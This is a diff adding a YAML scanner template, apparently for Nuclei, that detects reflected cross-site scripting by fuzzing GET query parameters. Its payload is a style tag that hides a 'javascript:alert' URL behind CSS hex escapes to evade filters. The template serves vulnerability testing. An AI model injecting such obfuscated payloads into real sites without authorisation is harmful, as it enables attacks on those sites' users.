@@ -1,0 +1,39 @@
+id: fuzz-reflection-xss-style
+
+info:
+  name: Custom Reflection XSS via Style Tag Detection
+  author: netbaan
+  severity: low
+  description: |
+    This template is designed to detect reflection XSS vulnerabilities using a style-based payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      reflection:
+        - "<style>*{background-image:url('\\6A\\61\\76\\61\\73\\63\\72\\69\\70\\74\\3A\\61\\6C\\65\\72\\74\\28\\6C\\6F\\63\\61\\74\\69\\6F\\6E\\29')}</style>"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
